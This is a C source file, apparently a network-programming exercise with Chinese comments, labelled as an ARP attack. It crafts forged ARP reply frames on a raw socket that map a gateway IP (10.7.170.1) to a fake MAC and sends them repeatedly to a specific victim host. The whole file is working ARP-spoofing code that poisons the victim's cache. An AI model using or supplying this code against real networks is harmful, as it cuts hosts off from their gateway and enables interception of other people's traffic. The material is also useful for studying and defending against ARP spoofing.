/* ----------arp---------攻击*/
#include <stdio.h>
#include <sys/socket.h>     
#include <arpa/inet.h>     
#include <linux/if_ether.h> 
#include <netpacket/packet.h>
#include <pthread.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <net/ethernet.h>

void my_sendto(int sockfd, unsigned char *msg, int len, char *if_name);

struct arphdr
{
    unsigned short int ar_hrd;        /* Format of hardware address.  */
    unsigned short int ar_pro;        /* Format of protocol address.  */
    unsigned char ar_hln;             /* Length of hardware address.  */
    unsigned char ar_pln;             /* Length of protocol address.  */
    unsigned short int ar_op;         /* ARP opcode (command).  */
    unsigned char __ar_sha[ETH_ALEN]; /* Sender hardware address.  */
    unsigned char __ar_sip[4];        /* Sender IP address.  */
    unsigned char __ar_tha[ETH_ALEN]; /* Target hardware address.  */
    unsigned char __ar_tip[4];        /* Target IP address.  */
};

int main(int argc, char const *argv[])
{
    // 创建原始套接字
    int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0)
    {
        perror("socket");
        return 0;
    }

    //构建arp应答报文
    unsigned char msg[256] ="";
    //封装mac报文
    struct ether_header *eth_hdr = (struct ether_header *)msg;
    u_int8_t src_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x11};  //加的mac
    u_int8_t dst_mac[6] = {0x60,0x18,0x95,0x70,0xc6,0xb2};  //被攻击的主机mac
    memcpy(eth_hdr->ether_dhost, dst_mac, 6);
    memcpy(eth_hdr->ether_shost, src_mac, 6);
    eth_hdr->ether_type = htons(0x0806);

    //封装arp应答报文
    unsigned char src_ip[4]= {10,7,170,1};    //网关的IP
    unsigned char dst_ip[4]= {10,7,170,8};   //被攻击的IP
    
    struct arphdr *arp_hdr = (struct arphdr *)(msg+14);
    arp_hdr->ar_hrd = htons(1);            // 硬件类型
    arp_hdr->ar_pro = htons(0x0800);       // 协议类型
    arp_hdr->ar_hln = 6;                   // 硬件地址长度
    arp_hdr->ar_pln = 4;                   // 协议地址长度
    arp_hdr->ar_op = htons(2);             // arp应答
    memcpy(arp_hdr->__ar_sha, src_mac, 6); // 源mac
    memcpy(arp_hdr->__ar_sip, src_ip, 4);  // 源IP
    memcpy(arp_hdr->__ar_tha, dst_mac, 6); // 目的mac
    memcpy(arp_hdr->__ar_tip, dst_ip, 4);

    for (int i = 0; i < 20; i++)
    {
        my_sendto(sockfd, msg, 14+28, "ens33");
        sleep(3);
    }
    
    close(sockfd);
    return 0;
}

void my_sendto(int sockfd, unsigned char *msg, int len, char *if_name)  //if_name 网络接口名称
{
    //从ens33网络接口发送msgarp请求帧数据
    struct ifreq ethreq;
    strncpy(ethreq.ifr_name, if_name, IF_NAMESIZE);
    if (-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
    {
        perror("ioctl");
        close(sockfd);
        _exit(-1);
    }

    struct sockaddr_ll sll;
    bzero(&sll, sizeof(sll));
    sll.sll_ifindex = ethreq.ifr_ifindex;
    //发送arp请求
    int ret = sendto(sockfd, msg, len, 0, (struct sockaddr*)&sll, sizeof(sll));
    if (ret < 0)
    {
        perror("sendto");
        close(sockfd);
        _exit(-1);
    }
}

